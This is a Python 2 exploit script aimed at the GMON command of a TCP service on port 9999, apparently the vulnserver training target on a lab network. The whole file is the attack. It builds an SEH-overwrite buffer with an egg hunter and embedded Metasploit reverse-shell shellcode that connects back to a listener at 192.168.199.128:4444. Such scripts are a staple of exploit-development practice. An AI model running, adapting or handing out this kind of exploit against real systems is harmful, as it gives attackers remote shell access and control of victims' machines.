#!/usr/bin/python

import socket
import struct

ip_addr = '192.168.199.130'
port = 9999

print "GMON command - Exploit, Egg hunter\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    # Reverse Shell
    # msfpayload windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 EXITFUN=NONE R | msfencode -b '\x00' -t c
    buf = (
    "\xb8\x97\x76\xdf\x36\xdb\xc6\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
    "\x4f\x31\x42\x14\x03\x42\x14\x83\xea\xfc\x75\x83\x23\xde\xf0"
    "\x6c\xdc\x1f\x62\xe4\x39\x2e\xb0\x92\x4a\x03\x04\xd0\x1f\xa8"
    "\xef\xb4\x8b\x3b\x9d\x10\xbb\x8c\x2b\x47\xf2\x0d\x9a\x47\x58"
    "\xcd\xbd\x3b\xa3\x02\x1d\x05\x6c\x57\x5c\x42\x91\x98\x0c\x1b"
    "\xdd\x0b\xa0\x28\xa3\x97\xc1\xfe\xaf\xa8\xb9\x7b\x6f\x5c\x73"
    "\x85\xa0\xcd\x08\xcd\x58\x65\x56\xee\x59\xaa\x85\xd2\x10\xc7"
    "\x7d\xa0\xa2\x01\x4c\x49\x95\x6d\x02\x74\x19\x60\x5b\xb0\x9e"
    "\x9b\x2e\xca\xdc\x26\x28\x09\x9e\xfc\xbd\x8c\x38\x76\x65\x75"
    "\xb8\x5b\xf3\xfe\xb6\x10\x70\x58\xdb\xa7\x55\xd2\xe7\x2c\x58"
    "\x35\x6e\x76\x7e\x91\x2a\x2c\x1f\x80\x96\x83\x20\xd2\x7f\x7b"
    "\x84\x98\x92\x68\xbe\xc2\xfa\x5d\x8c\xfc\xfa\xc9\x87\x8f\xc8"
    "\x56\x33\x18\x61\x1e\x9d\xdf\x86\x35\x59\x4f\x79\xb6\x99\x59"
    "\xbe\xe2\xc9\xf1\x17\x8b\x82\x01\x97\x5e\x04\x52\x37\x31\xe4"
    "\x02\xf7\xe1\x8c\x48\xf8\xde\xac\x72\xd2\x68\xeb\xe5\x1d\xc2"
    "\x34\x75\xf5\x11\xba\x67\x5a\x9f\x5c\xed\x72\xc9\xf7\x9a\xeb"
    "\x50\x83\x3b\xf3\x4e\x03\xdf\x66\x15\xd3\x96\x9a\x82\x84\xff"
    "\x6d\xdb\x40\x12\xd7\x75\x76\xef\x81\xbe\x32\x34\x72\x40\xbb"
    "\xb9\xce\x66\xab\x07\xce\x22\x9f\xd7\x99\xfc\x49\x9e\x73\x4f"
    "\x23\x48\x2f\x19\xa3\x0d\x03\x9a\xb5\x11\x4e\x6c\x59\xa3\x27"
    "\x29\x66\x0c\xa0\xbd\x1f\x70\x50\x41\xca\x30\x60\x08\x56\x10"
    "\xe9\xd5\x03\x20\x74\xe6\xfe\x67\x81\x65\x0a\x18\x76\x75\x7f"
    "\x1d\x32\x31\x6c\x6f\x2b\xd4\x92\xdc\x4c\xfd")

    EGG = "T00W"

    shellcode_buffer = '\x90'*100 + EGG + EGG + buf + '\x90'*100
   
    # Egghunter Buffer
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    egghunter_buffer = "\x90" * (90 - len(egghunter)) + egghunter + '\x90'*10

    nseh = '\xeb\xD0\x90\x90' # Negative jump, 48 bytes
    seh = struct.pack("<I", 0x625010B4) 
    buffer = "GMON /.:/" + 'A'* (3495-100-len(shellcode_buffer)) + shellcode_buffer + egghunter_buffer + nseh + seh + 'E' * (5000-3495-4-4)

    bytes_sent = s.send(buffer)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
